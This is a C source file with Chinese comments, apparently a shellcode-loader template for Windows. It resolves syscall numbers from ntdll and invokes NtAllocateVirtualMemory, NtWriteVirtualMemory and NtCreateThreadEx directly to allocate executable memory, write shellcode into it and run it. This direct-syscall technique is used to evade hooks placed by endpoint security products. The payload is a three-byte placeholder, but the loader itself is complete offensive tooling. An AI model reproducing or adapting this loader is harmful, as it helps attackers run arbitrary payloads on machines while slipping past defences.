#include <Windows.h>
#include<stdio.h>
#include "syscalls.h"

// 全局变量，供汇编和其他文件访问
__declspec(dllexport) FuncationName direct_syscall = { 0 };

INT main() {
    PVOID allocBuffer = NULL;
    SIZE_T buffSize = 0x1000;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // 初始化 NtAllocateVirtualMemory
    direct_syscall.NtAllocateVirtualMemory.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    direct_syscall.NtAllocateVirtualMemory.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtAllocateVirtualMemory.sysAddress + 4))[0];

    // 初始化其他系统调用
    direct_syscall.NtWriteVirtualMemory.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    direct_syscall.NtWriteVirtualMemory.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtWriteVirtualMemory.sysAddress + 4))[0];

    direct_syscall.NtCreateThreadEx.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    direct_syscall.NtCreateThreadEx.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtCreateThreadEx.sysAddress + 4))[0];

    direct_syscall.NtWaitForSingleObject.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    direct_syscall.NtWaitForSingleObject.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtWaitForSingleObject.sysAddress + 4))[0];

    // 调用 NtAllocateVirtualMemory 分配内存
    NTSTATUS status = NtAllocateVirtualMemory(
        (HANDLE)-1,            // 当前进程句柄
        &allocBuffer,          // 分配内存的起始地址
        0,                     // ZeroBits
        &buffSize,             // 分配内存的大小
        MEM_COMMIT | MEM_RESERVE, // 内存分配类型
        PAGE_EXECUTE_READWRITE // 内存保护
    );

    if (status != 0) {
        printf("NtAllocateVirtualMemory failed: 0x%x\n", status);
        return -1;
    }

    // 写入 Shellcode
    unsigned char shellcode[] = "\xfc\x48\x83";
    ULONG bytesWritten;

    status = NtWriteVirtualMemory(
        GetCurrentProcess(), // 当前进程
        allocBuffer,         // 写入的目标地址
        shellcode,           // 写入的数据
        sizeof(shellcode),   // 数据大小
        &bytesWritten        // 实际写入的大小
    );

    if (status != 0) {
        printf("NtWriteVirtualMemory failed: 0x%x\n", status);
        return -1;
    }

    // 创建线程以执行 Shellcode
    HANDLE hThread;

    status = NtCreateThreadEx(
        &hThread,                   // 线程句柄
        GENERIC_EXECUTE,            // 权限
        NULL,                       // 对象属性
        GetCurrentProcess(),        // 当前进程
        (LPTHREAD_START_ROUTINE)allocBuffer, // 线程入口点
        NULL,                       // 参数
        FALSE,                      // 标志
        0,                          // 栈零位
        0,                          // 栈提交大小
        0,                          // 栈保留大小
        NULL                        // 字节缓冲区
    );

    if (status != 0) {
        printf("NtCreateThreadEx failed: 0x%x\n", status);
        return -1;
    }

    // 等待线程完成
    status = NtWaitForSingleObject(hThread, FALSE, NULL);

    if (status != 0) {
        printf("NtWaitForSingleObject failed: 0x%x\n", status);
        return -1;
    }

    return 0;
}
